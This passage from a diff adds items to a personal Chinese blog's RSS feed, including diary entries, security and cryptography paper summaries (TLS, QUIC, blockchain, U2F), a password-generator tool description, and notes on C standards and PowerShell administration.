|&#xD;+--------------+--------------+-+-------------+&#xD;| QUIC Transport |&#xD;+---------------------------------------------+&#xD;| QUIC Data Package Protect |&#xD;+---------------------------------------------+ 三、TLS 交互流程（个人理解） QUIC 使用 CRYPTO 帧将 TLS 握手协议打包并发送，在传输过程中保证可靠达到。 QUIC 将 TLS 告警协议中的错误值取出后封装在 CONNECTION_CLOSE 帧中。 QUIC 将 HelloRetryRequest 用于纠错时，取出并改为发送 Retry_Package。 QUIC 使用短头部中的 KEY_PHASE 来代替TLS中的KeyUpdate 消息来进行秘钥变更。 握手协议流程（作者理解）：</description>
+    </item>
+    <item>
+      <title>生活日志| Diary20191108</title>
+      <link>https://www.elliot98.top/post/life/diary20191108/</link>
+      <pubDate>Fri, 08 Nov 2019 15:19:43 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/diary20191108/</guid>
+      <description>191108 日記 这段时间的身体不太好。八月份方才做了手术，九月份就再次住院。这次是胰腺炎，很惨，很长一段时间不能吃油荤。的确，现在我回忆起来前一两个月都是在惶恐中度过，眼前还有医院和点滴的影子。不过还是要向前看，这几天我没有再发作，希望向好的方向发展。&#xA;除此之外，大四的生活可以说是非常安逸了，确定保研之后，基本上就没有任何指标称为你的动力。突然不用在意成绩的感受是十分特别的，感觉很任性，又有一点不安。实验室的生活也还挺丰富，坦率的说没有做出太多的工作，但是却学到了杂七杂八的东西。&#xA;近期花钱了不少，比如买了新的相机，索尼a7iii，很贵，要1w好几千，镜头也很贵。不过确实能拍出惊艳的照片。很喜欢新相机。不过我觉得我拍照最大的问题在于心机，摄影是一门慢工出细活的艺术，需要静下心来，仔细构图、对焦。不然回看的时候发现大部分照片都没有对上焦，着实可惜。也体现了自己的不扎实。</description>
+    </item>
+    <item>
+      <title>Happy Birthday to BM</title>
+      <link>https://www.elliot98.top/zone/1/</link>
+      <pubDate>Mon, 28 Oct 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/zone/1/</guid>
+      <description>Happy Birthday to you, Be happy and healthy!</description>
+    </item>
+    <item>
+      <title>I got my first salary</title>
+      <link>https://www.elliot98.top/zone/2/</link>
+      <pubDate>Mon, 14 Oct 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/zone/2/</guid>
+      <description>In this semester, I am a TA for C Language Programming. Today I got my first salary in my life. I felt proud of myself.</description>
+    </item>
+    <item>
+      <title>论文阅读| Safely Exporting Keys from Secure Channels: On the Security of EAP-TLS and TLS Key Exporters</title>
+      <link>https://www.elliot98.top/post/lab/key-export-from-tls-like-protocal/</link>
+      <pubDate>Sun, 22 Sep 2019 15:23:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/key-export-from-tls-like-protocal/</guid>
+      <description>Safely Exporting Keys from Secure Channels: On the Security of EAP-TLS and TLS Key Exporters Christina Brzuska, Håkon Jacobsen, and Douglas Stebila Define: ACCE ACCE protocal: authenticated and confidential channel establishment (ACCE)&#xA;Examples: TLS,SSH,QUIC(TLS-like)&#xA;理论上已经证明了这些协议所派生出来的主秘钥是 indistinguishability 的。&#xA;Define: TLS-like TLS-like protocal:&#xA;双方产生随机数 协商出一个 master key Session key 由 master key 派生 Define: AKE AKE: authenticated key exchange&#xA;指在认证的信道上进行秘钥交换和派生的协议。&#xA;主要工作 主要是两方面工作：&#xA;理论证明了在最广泛情形下 ACCE 安全的信道上，使用 master key 派生进行秘钥交换是 indistinguishability 的且可以独立于master key。以往的工作是在给定的（如TLS1.2基础之上的安全证明） 给出了在通用 TLS-like 的协议上的最一般 AKE 协议的形式。 具体应用与 EAP-TLS 协议 </description>
+    </item>
+    <item>
+      <title>论文笔记：The use of TLS in Censorship Circumvention</title>
+      <link>https://www.elliot98.top/post/lab/ndss2019-the-use-of-tls-in-censorship-circumvention/</link>
+      <pubDate>Wed, 18 Sep 2019 15:56:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ndss2019-the-use-of-tls-in-censorship-circumvention/</guid>
+      <description>The use of TLS in Censorship Circumvention Network and Distributed Systems Security (NDSS) Symposium 2019 Sergey Frolov, Eric Wustrow. University of Colorado Boulder Abstract collect and analyze TLS Client Hello messages analyze existing censorship circumvention projects that use develop a library, uTLS, that allows developers to easily mimic arbitrary TLS handshakes of popular implementations 真实访问TLS的特征 Client Hello Server Hello Connection-specific information BroserStack 获取了诸如 chrome 等ssl客户端的tls指纹。&#xA;Client Hello fingerpoints 99.96% of all connections use one of top 5000 Client Hello fingerprints, and one of top 1310 Server Hello fingerprints.</description>
+    </item>
+    <item>
+      <title>论文笔记| maTLS: How to Make TLS middlebox-aware?</title>
+      <link>https://www.elliot98.top/post/lab/ndss2019-matls/</link>
+      <pubDate>Wed, 18 Sep 2019 15:55:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ndss2019-matls/</guid>
+      <description>maTLS: How to Make TLS middlebox-aware? Hyunwoo Lee, Zach Smith, Junghwan Lim†, Gyeongjae Choi, Selin Chun, Taejoong Chung, Ted “Taekyoung” Kwon&#xA;Network and Distributed Systems Security (NDSS) Symposium 2019&#xA;Current Solution MITM:&#xA;Client: fake root certificate Server: CDNs request server private keys. =&amp;gt; Increased risks in MITM attack&#xD;=&amp;gt; How to work honestly?&#xD;1. encryption-based&#xD;2. TEE-based&#xD;3. TLS extension-based SplitTLS:&#xA;authentication: client can not authenticate the intend server Confidentiality: weak ciphersuite Integrity：Not behaved Middlebox maTLS:</description>
+    </item>
+    <item>
+      <title>论文阅读| Hybrid key exchange in TLS 1.3 or SSH</title>
+      <link>https://www.elliot98.top/post/lab/hybrid-key-exchange/</link>
+      <pubDate>Tue, 17 Sep 2019 15:55:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/hybrid-key-exchange/</guid>
+      <description>Hybrid key exchange in TLS 1.3 or SSH Draft-stebila-tls-hybrid-design-01 Motivation of hybrid key exchange tranditional algorithms: have risks in face of quantum computers and cryptanalytic advances next-generation algorithms: have less confidence in security (due to less studies) Prototyping post-quantum and hybrid key exchange and authentication in TLS and SSH hybrid key exchange and hybrid signatures&#xA;1.Key Exchange is listed above. 2.Authentication：&#xA;extension signature_algorithms_cert and signatur_algorithms&#xA;both algorithms should sign the same message.</description>
+    </item>
+    <item>
+      <title>RFC 8446| Transport Layer Security 1.3</title>
+      <link>https://www.elliot98.top/post/lab/rfc8446/</link>
+      <pubDate>Wed, 11 Sep 2019 21:04:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/rfc8446/</guid>
+      <description>Transport Layer Security 1.3 (RFC 8446) 1. Major differences from TLS 1.2 All legacy algorithms have been deprecated. TLS 1.3 uses AEAD instead. 0-RTT (zero round-trip time) mode was added. All public-key based key exchange mechanisms now provide forward secrecy. Simplified the handshake state machine (removed ChangeCipherSpec in most common cases). Cryptographic improvements. KDF: HMAC-based KDF RSA padding DSA removed Ephemeral Diffie-Hellman removed Session resumption has beed replaced by a simple PSK exchange AEAD: Authenticated Encryption with Associated Data</description>
+    </item>
+    <item>
+      <title>论文笔记| Proof-of-Stake Sidechains</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-6/</link>
+      <pubDate>Mon, 15 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-6/</guid>
+      <description>Brief Authors: Peter Gazˇi,Aggelos Kiayias and Dionysis Zindros conference: S&amp;amp;P2019 系统定义区块链中的 side 链的概率，1️以提高区块链的伸缩性和冗余。证明其非常适合使用POS作为共识机制。并将其实现和推广到多个区块链系统中去。&#xA;使用 sidechain 可以解决数据拷贝、扩容、升级区块链协议等。&#xA;形式化定义了什么是sidechain。以及如何将一个账单中的信息转换成另一个账单。定义了其安全性。&#xA;其中用到了一个聚合签名算法 ATMS AD-HOC THRESHOLD MULTISIGNATURES 是一种基于门限的聚合签名算法。</description>
+    </item>
+    <item>
+      <title>论文笔记| Redactable Blockchain or Rewriting history in Bitcoin and friends</title>
+      <link>https://www.elliot98.top/post/lab/ps2017-1/</link>
+      <pubDate>Fri, 12 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2017-1/</guid>
+      <description>brief 这篇文章主要引入了 Chameleon Hash 函数。这个函数引入了一对公私钥。使用公钥和消息来产生hash函数。如果不知道私钥，则很难碰撞，但是如果知道私钥，就很容易进行碰撞。&#xA;应用于区块链中，则开始产生这样一对秘钥，公钥共享，私钥按照秘密共享的机制使得监督组的部分节点拥有部分私钥。当需要恢复的时候，使用多方安全计算的算法，恢复出私钥，对数据修改后，维持区块链的性质。</description>
+    </item>
+    <item>
+      <title>论文笔记| Redactable Blockchain in the Permissionless Setting</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-5/</link>
+      <pubDate>Wed, 10 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-5/</guid>
+      <description>Brief Author：Dominic Deuber, Bernardo Magri and Sri Aravinda Krishnan Thyagarajan IEEE S&amp;amp;P 2019 Introductoin 一种基于共识机制的协议，用于解决区块链中非法信息进行预警和和可审计的操作，要求可以很好的兼容当前的 bitcoin。&#xA;由于区块类的写入是不可撤回的、在写入前又无法审计，所以对于没有访问控制的区块链来说很难做到过滤和预警。&#xA;通过投票，多数同意来实现一个 editable 的区块。&#xA;感觉就是有协议的硬分叉。读完 intro 后个人感觉可能有诸多问题&#xA;大致协议 对要修改的区块，通过某一个策略函数 P 来决定是否通过，有 accept reject 和vote 三种结果。如果最终接受修改，则由全体成员执行修改的过程。如果投票，则经过多轮投票过程后决定结果&#xA;如果要对之前某一个区块修改，则保留其原始数据，并对对其进行修改。此时需要对于验证区块和区块链的算法进行一定修改。&#xA;实现和评估 最后在bitcoin 上加以实现，而后对安全性和性能进行了评估和分析。</description>
+    </item>
+    <item>
+      <title>论文笔记| Towards Practical Differentially Private Convex Optimization</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-4/</link>
+      <pubDate>Wed, 10 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-4/</guid>
+      <description>Brief Roger Iyengar Carnegie Mellon University Om Thakkar Boston University Joseph P. Near University of California, Berkeley Abhradeep Thakurta University of California, Santa Cruz Dawn Song University of California, Berkeley Lun Wang Peking University 将差分隐私用于凸优化问题中，并处理实际数据集合。文中给出了一个新的训练算法。</description>
+    </item>
+    <item>
+      <title>论文笔记| True2F: Backdoor-resistant authentication tokens</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-3/</link>
+      <pubDate>Tue, 09 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-3/</guid>
+      <description>Brief author: Emma Dauterman, Henry Corrigan-Gibbs, David Mazières, Dan Boneh, Dominic Rizzo From: Stanford and Google Introduction 双因子认证是目前对抗弱密码等恶意攻击的有效手段。其中一种是使用 U2F 硬件认证。但是使用硬件也可能给系统带来新的安全隐患（后门等）。&#xA;由于 U2F 在分发过程中需要在服务器中记录 seed，一旦攻击装获取seed就可以恢复公私钥，进而破坏系统安全性。&#xA;使用主秘钥和会话秘钥分离也可能发生cache和 swap 攻击等。&#xA;U2F 认证过程 U2F 双因子认证设计三个对象：U2F 硬件、浏览器和可靠服务器。&#xA;协议要求 防止恶意的token 防止 compromised browser Protect against token fingerprinting. 对服务器端透明 不改变硬件条件 密码学技术 1. 数字签名 Sig.KeyGen() → (sk, pk). Output a secret signing key sk and a public verification key pk. Sig.Sign(sk, m) → σ. Output a signature σ on the message m ∈ M using the secret key sk.</description>
+    </item>
+    <item>
+      <title>论文笔记| Why Does Your Data Leak? Uncovering the Data Leakage in Cloud from Mobile Apps</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-2/</link>
+      <pubDate>Tue, 09 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-2/</guid>
+      <description>Brief author: Chaoshun Zuo, Zhiqiang Lin, Yinqian Zhang IEEE S&amp;amp;P 2019 Introduction 系统评估移动终端使用云存储时候的数据泄露 编写程序自动化完成评估 对各种软件进行评估，给出风险报告 Background 为什么要使用 Cloud API？&#xA;减少成本，无需自己搭建后端或租用服务器，无需考虑鲁棒性和伸缩性。&#xA;Cloud API 的两种秘钥&#xA;app key： 有限权限，用于访问公开数据并可以隔离资源，防止在用户app中。 root key： 完整的访问权限，用于开发和管理 系统分析 秘钥误用，将两种秘钥混用 访问控制配置错误 自动化分析框架 方法：根据 API 的句柄、输入输出参数来判断。&#xA;包括：Cloud API identification、String Value identification 和 Vulnerability Identification。&#xA;评估 对大量程序进行了分析，分析结果略</description>
+    </item>
+    <item>
+      <title>论文笔记| Resident Evil: Understanding Residential IP Proxy as a Dark Service</title>
+      <link>https://www.elliot98.top/post/lab/ps2019-1/</link>
+      <pubDate>Mon, 08 Jul 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ps2019-1/</guid>
+      <description>Brief Meeting: S&amp;amp;P 2019 Authors: Xianghang Mi, Xuan Feng, Xiaojing Liao, Baojun Liu, XiaoFeng Wang, Feng Qian, Zhou Li, Sumayah Alrwais, Limin Sun, Ying Liu Background 分布式反射拒绝服务攻击体现了一种利用新型的家用IP代理的攻击方式。&#xA;Residential IP Proxy as a Service (RPaaS) 指代了控制了大量家用终端（自愿加入）的提供代理网络的服务。一些公司提供这样的服务。这种服务可以用于 DoS，爬虫，恶意破坏 SEO 等非法攻击。&#xA;Conclusions 这种网络分布在 238 个国家，52905 个独立IP。其中 95% 是家庭设备。 发现大量设备并非自愿加入网络。即使是部分设备也是妥协的结果 正在运行在代理网络之上的有 67 个程序，其中 50 个可能是恶意的程序。 只有 9.36% 的终端检测到了这种恶意流量，更有部分安全检测主机是 RPaaS 的一员。 代理商可能使用其他代理商的网络（多级零售），有些代理商没有背景审查并接受比特币。 鉴别了后台网关。这些网关部分被检测到而已并被屏蔽。 Method and Dataset 这些网络通过 http/https 等方式发起请求。&#xA;一个实验用的客户端发起某一个域名的请求。这些域名中包括了时间戳，uuid等信息。 一个dns服务器，用于由网络中的host查询dns时候，记录发送方的ip等信息，并返回接收器的ip 一个接收器，用于接收最终的请求。 为了对流量进行伪装。作者使用了多个位于不同地域的服务器。并对流量使用 aes128 加密。</description>
+    </item>
+    <item>
+      <title>技术摘要| Erpass</title>
+      <link>https://www.elliot98.top/post/tech/erpass/</link>
+      <pubDate>Wed, 26 Jun 2019 17:23:56 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/erpass/</guid>
+      <description>Erpass 一个安全的密码生成软件 原始网站： blog.ertuil.top&#xA;项目地址：https://github.com/ertuil/erpass&#xA;最近研究各个网站的口令管理。发现主要有两种类型的口令管理。一种是以 1password,lastpass 等为代表的的口令管理软件，其核心思路是把口令存在安全仓库中。但是这些软件不是闭源（担心后门）就是不太好用。 另外一种就是以 lesspass.com，花舟 为代表的无状态的密码生成算法。通过主秘钥和其他信息来生成固定的口令。&#xA;我在此基础之上重新实现了一个类似的网站，目前已经托管了一些不太重要的网站的口令（在大量测试安全性后可能考虑完全使用）。主要有如下特点：&#xA;无状态，意味着服务器没有任何数据库或者其他信息。 采用了 PDPKF2-HMAC-SHA256 和其他算法，多次迭代之后产生强度足够的密码 部署相关性，每一次部署都生成独立的秘钥，这意味着每一个部署即便主密码和其他信息完全一样，也好吧产生不同的结果 基于 Golang 语言，跨平台、单文件，可以很方便的在各种平台部署。 安装方法 erpass -d true --host 0.0.0.0 --port 1234 使用方法 记住一个主密码 Master Key 即可（需要强度足够、复杂、且没有在别处使用）。而后输入状态信息，点击 copy 就复制到剪贴板了。&#xA;也可以在命令行中使用 erpass -g qq.com 而后输入主密码的方式来生成。&#xA;安全相关 每一个部署都产生了单独的 secret key,这意味着不同部署是互相独立的，也意味着产生的 secret key 需要单独备份。 Master Key 不提供任何可以找回的手段。 一定需要使用 nginx 作为前端使用 https 部署。 算法 PDPKF2 一种工业级的基于口令的密码派生算法多轮迭代，SHA256 杂凑函数。</description>
+    </item>
+    <item>
+      <title>论文笔记| YODA: Enabling computationally intensive contracts on blockchains with Byzantine and Selfish nodes</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-7/</link>
+      <pubDate>Tue, 14 May 2019 17:20:14 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-7/</guid>
+      <description>YODA: Enabling computationally intensive contracts on blockchains with Byzantine and Selfish nodes Sourav Das, Vinay Joseph Ribeiro and Abhijeet Anand Network and Distributed Systems Security (NDSS) Symposium 2019 Introduction 传统公开链的结构并不适合用于大批量的计算场景（比如深度学习和零知识证明）。主要有如下几个原因：&#xA;每一个合约的执行需要缴纳手续费。计算量大意味着昂贵的手续费。 每个验证计算需要花费大量的时间，节点可能会选择跳过验证，以快速开始下一个区块的计算，导致安全性下降 有两种一直的改进方法，但都有缺点：&#xA;将重度计算过程分散成多步骤，发在多个区块中 离线的执行智能合约 文章实现了一种离线 CIC 的执行策略，能在公开链上实现有效的重度计算协约的执行。方案允许低于 50% 的节点是拜占庭的，剩下的节点都是 quesi-honest 的。&#xA;Threat Model 考虑两种节点:&#xA;Byzantine Node 受到恶意节点控制，可能会随意添加、删除数据，可能会不正确的执行协议 Quesi-Honest node 基本可信的节点。如实完成协议。但是如果有可能的话，就引入已有的计算量，以减轻自己的计算负担。 方案选取了一部分 Execution Set 的节点集合，由这些节点来进行 CIC 计算。Yoda 使用一种叫做 MultI-Round Adaptive Consensus using Likelihood Estimation (MIRACLE) 的共识机制来保证计算的可靠性。&#xA;We achieve this by making the digest dependent on a set of pseudo-randomly chosen intermediate states of a CIC execution.</description>
+    </item>
+    <item>
+      <title>论文笔记| Sajin Sasy, Sergey Gorbunov, Christopher W. Fletcher. ZeroTrace: Oblivious Memory Primitives from Intel SGX.</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-6/</link>
+      <pubDate>Tue, 14 May 2019 17:15:53 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-6/</guid>
+      <description>Sajin Sasy, Sergey Gorbunov, Christopher W. Fletcher. ZeroTrace: Oblivious Memory Primitives from Intel SGX. Network and Distributed Systems Security (NDSS) Symposium 2018 这篇工作主要是结合了密码学和可信硬件，设计和实现了一个 Oblivious Memory Primitives 系统，并进行了性能分析。这篇工作与之前的一篇工作较为相似。&#xA;这个系统主要是为了解决计算外包中的隐私保护问题。文中指出传统密码学的手段 overhead 极大且容易有信息泄漏，而完全使用 sgx 也有很多问题。比如代码需要修改带来 trade-off，此外 sgx 的 io 性能较弱。&#xA;文中主要贡献是设计一种通用的库，来加密和混淆用户数据。并提供了读取和写入的操作，而后在此基础之上实现了多种数据结构（如 list 等）。具体细节不提。最后给出了性能评估。</description>
+    </item>
+    <item>
+      <title>技术摘要| 现代 C99, C11 标准下的 C 语言编程</title>
+      <link>https://www.elliot98.top/post/tech/modern_c_standard/</link>
+      <pubDate>Sat, 13 Apr 2019 14:50:02 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/modern_c_standard/</guid>
+      <description>现代 C99, C11 标准下的 C 语言编程 一、摘要 一直以来，我们所学习的 C 语言大多是 ANSI-C 标准，也就是后来被标准化的 C89 标准。在 1999 年发布的 C99 和 2011 年发布的 C11 标准在此之上，引入了许多新的特性，也解决了许多问题。因此，随着标准的发布，我们的 C 语言规范和写法也要发生相应的变化。&#xA;C++ 同样也发布了 C++99，C++11，C++14 甚至 C++17 规范。从变化上看，C++11 规范之后的 C++ 语言已经焕然一新，引入了大量非常现代化的特性。C 语言规范的最大的变化则发生在 C99 规范之中。其后的 C11 虽然也有一些特性，但更多的算是为了于 C++ 同步而引入的新特性。&#xA;目前的 GCC 和 Clang 编译器都已经完整支持 C99 和 C11 的特性，默认都是支持 C11 规范。如果需要显式指定的时候，则在编译时加入 -std=c99 或者 -std=c11 即可。&#xA;本文将介绍这两个协议下带来的新特性，和我们新的编码习惯的变化。&#xA;二、新的基本数据类型规范 在 C99 规范中，有着大量对于新的数据类型的定义和补充。这是非常有必要的，原先的 int，long 等变量基本类型在不同架构的机器上，会有不同的长度，往往会导致不可预期的问题。64 位数值、布尔类型和复数类型的缺失、以及 Unicode 的缺失也阻碍了 C 语言在现代的进一步发展。因此，C99 类型中带来了大量编码类型的变化。&#xA;2.1 数值类型 我们经常因为数据类型在不同架构机器上的不同表现，而感到困扰。因此在 C99 规范中，引入了标准的固定长度数据类型的规范，并且引入了 64 位数据类型的支持。在 32 位机器上，你可能需要使用 long long 来建立一个 64 位的数据类型。而在 64 位机器上，long 即表示 64 位数据类型。</description>
+    </item>
+    <item>
+      <title>技术摘要| Atom 的第一次尝试</title>
+      <link>https://www.elliot98.top/post/tech/atom%E5%B0%9D%E8%AF%95/</link>
+      <pubDate>Tue, 09 Apr 2019 12:02:57 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/atom%E5%B0%9D%E8%AF%95/</guid>
+      <description>Atom 的第一次尝试 对于我来说，折腾已经成为了一种习惯了。耐不住性子的我常常会去折腾各种新的东西，编辑器、系统、浏览器这些我都会经常去尝试，去找到哪一款自己最喜爱的和效率最高的产品。&#xA;我个人对于编辑器的要求还是很高的，要能够敏捷、好用，还得长得好看。也尝试过主流的各种编辑器，比如 VsCode，Vim 以及 emacs。在我的潜意识里，我非常喜欢 Emacs 的快捷键，特别是光标移动的部分： alt 代表单词，ctrl 代表字符，PNBF 代表上下左右，非常清晰。但是我又希望能够减少我配置的压力，要能够开箱即用，还要有较强的功能。因此，Vim 和 Emacs 这类需要进行配置的环境对我来说其实不够优雅。我希望能够尽可能使用默认的配置，而不过多的进行配置修改，快捷键也是如此。（因为能够保证多平台的一致性）。&#xA;其实 Visual Studio Code 确实挺符合这个标准，我也一直拿它作为我的主要编辑器，写过 go，写过 javascript，也写过 python 和 C。VsCode 其实真的非常强大，编译、调试、代码托管、项目管理，这些功能齐全而且非常好用。此外还有异常丰富的插件系统。对于我个人来说，除非是大型项目，一般很少用 PyCharm 之类的 IDE。&#xA;现在我遇到了 Atom，我不敢保证我会一直使用这个编辑器（毕竟被吐槽性能差，让我非常顾虑），但是我会尽力去使用它。因为，它的默认快捷键非常符合我的预想，而且界面咸现代且好看。它的光标移动的快捷键和 Emacs 基本一致，我可以非常迅速的进行光标的移动。此外还有与 VsCode 类似的多光标，搜索、替换等等操作方式。原生的 Git 和 Github 支持也非常好用。&#xA;确实，使用快捷键可以方便的定位文件、函数，也可以方便的进行窗口的管理。对于我个人来说，这一套快捷键还是比较符合我的预期和使用习惯的。手不离开键盘，就能完成文本的编辑。（这一篇文章就是在 Atom 中便捷的）。&#xA;界面美观也是一个非常重要的因素，一直以来我都是使用 VsCode 的 Light+ 主题，换成 Atom 之后，我发现 One Dark 的配色和代码高亮也非常美观。&#xA;目前初步测试了代码补全的功能。Python 和 C 的支持都还算不错，应该问题不大。而让我有所顾虑的就是广为诟病的性能问题，实测内存占用至少是 VsCode 的 1.5 倍， 目前还没有遇到卡顿的现象，还需要进一步在使用中测试。&#xA;此外，代码调试和编译的功能是缺失的，或者需要第三方插件，这个对于我问题不大，我个人的编码习惯是习惯使用命令行编译和调试。反而对这一部分需求不大。&#xA;希望 Atom 能够让我的编码体验更加优秀吧。虽然 Github 已经被微软收购了，但是我还是希望它能够越来越好吧。</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（九）———— PowerShell 面向对象脚本语言</title>
+      <link>https://www.elliot98.top/post/tech/ps9/</link>
+      <pubDate>Sun, 07 Apr 2019 21:16:08 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps9/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（九）———— PowerShell 面向对象脚本语言 前面的几篇文章都是使用 PowerShell 作为主要交互脚本。在这些命令的使用过程中，已经初步体验到了面向对象的脚本语言于传统的基于文本的脚本语言的区别。这篇文章中将综合介绍 PowerShell 的一些知识和面对对象的部分。&#xA;一、 变量、环境变量 1.1 基本用法 变量全部以 $ 开头，用等号赋值。没有特殊的声明语句。例如：&#xA;PS C:\Windows\system32&amp;gt; $a = 1&#xD;PS C:\Windows\system32&amp;gt; $b = &amp;#34;Hello,World&amp;#34;&#xD;PS C:\Windows\system32&amp;gt; $a&#xD;1&#xD;PS C:\Windows\system32&amp;gt; $b&#xD;Hello,World 所有的变量全部存储在 Variable: 驱动器中。因此我们可以使用于导航文件目录一样的命令来管理变量。比如：&#xA;PS Variable:\&amp;gt; Test-Path Variable:a # 查找变量是否存在&#xD;True&#xD;PS Variable:\&amp;gt; Remove-Item Variable:b # 删除变量 1.2 PowerShell 自动化变量 下面这些变量在命令运行的过程中自动赋值：&#xA;\$\$ 上一个命令最后一个参数 $^ 上一个命令第一个参数 $? 上一个命令执行结果 $Error 错误数组 $Home 家目录 $Host 当前主机对象 $PID 当前进程ID $Profile 当前配置文件位置 等等</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（八）———— 计算机管理（进程、服务、日志）</title>
+      <link>https://www.elliot98.top/post/tech/ps8/</link>
+      <pubDate>Sun, 07 Apr 2019 18:56:00 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps8/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（八）———— 计算机管理（进程、服务、日志） 在 Windows Server Core 中，可以按住 Ctrl+Alt+Delete 来打开任务管理器，因此可以图形化的管理进程和服务。在 PowerShell 下也有非常良好的接口用于配置进程运行、服务运行和日志等。本文所介绍的绝大部分命令都是来自 Microsoft.PowerShell.Management 模块之中。在这个模块中，还有其他诸如查看计算机信息、设置市区、关机、重启、加入域、退出域等功能。&#xA;一、计算机信息查询（Get-ComputerInfo) 我们通常需要有一个命令来查询计算机的软硬件信息，包括内存、CPU、OS 等相关信息。PowerShell 提供了一个 Get-ComputerInfo 命令来查询这些基本信息。但是这个命令输出的条目过多，往往不能够很好的找到我们所需要的信息。因此需要在这个命令的基础上加以筛选来现实我们所需要的系统信息：&#xA;Get-ComputerInfo *process* # 获取处理器信息&#xD;Get-ComputerInfo *memory* # 获取内存用量信息&#xD;Get-ComputerInfo *OS* # 获取操作系统信息&#xD;Get-ComputerInfo *Bios* # BIOS 信息&#xD;Get-ComputerInfo *Timezone* # 时区&#xD;Get-COmputerInfo *Domain* # 加入的域名 PowerShell 支持完整的正则表达式支持，因此可以灵活地设置匹配字符串。&#xA;二、进程管理 Windows Server Core 中保留了任务管理器，在使用远程登录的情况下，是无需使用这些命令来进行进程管理的。但是有时候，我们使用 ssh 或远程连接 PowerShell 时，我们只有一个 Powershell 终端。此时，就需要我们使用命令行来进行管理。&#xA;Get-Process 可以用来获取当前的所有进程对象。在此基础上，我们可以加以搜索或者筛选，以此来查看我们所需要的进程对象：&#xA;PS C:\Windows\system32&amp;gt; Get-Process explorer&#xD;Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName&#xD;------- ------ ----- ----- ------ -- -- -----------&#xD;1531 58 31076 99056 3.</description>
+    </item>
+    <item>
+      <title>论文笔记| Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-5/</link>
+      <pubDate>Sun, 07 Apr 2019 09:16:29 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-5/</guid>
+      <description>Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment 作者：Daoyuan Wu, Debin Gao, Rocky K. C. Chang, En He, Eric K. T. Cheng, and Robert H. Deng&#xA;收录会议： Network and Distributed Systems Security (NDSS) Symposium 2019&#xA;一、摘要 文章主要完成了如下几件事：&#xA;对 136 个国家的三千多 Android 设备进行测量。对流行应用和 Built-in 应用进行测量。 对这些数据进行聚合和诊断。 完成了三项安全评估： vulnerability analysis revealing five vulnerability patterns in open ports of popular apps inter-device connectivity measurement in 224 cellular networks and 2,181 WiFi networks through crowdsourced network scans experimental demonstration of effective denial-of-service attacks against mobile open ports 之前已有的工作是发现了移动设备也有开放的端口，以及对特定应用程序使用开放端口的测试（截屏软件、文件分享软件等），但是这些工作只在局部给出了结论，而缺少对于 Open Ports in Android Application 这一个问题的宏观结果。</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（七）———— 防火墙与网络安全</title>
+      <link>https://www.elliot98.top/post/tech/ps7/</link>
+      <pubDate>Sat, 06 Apr 2019 20:20:00 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps7/</guid>
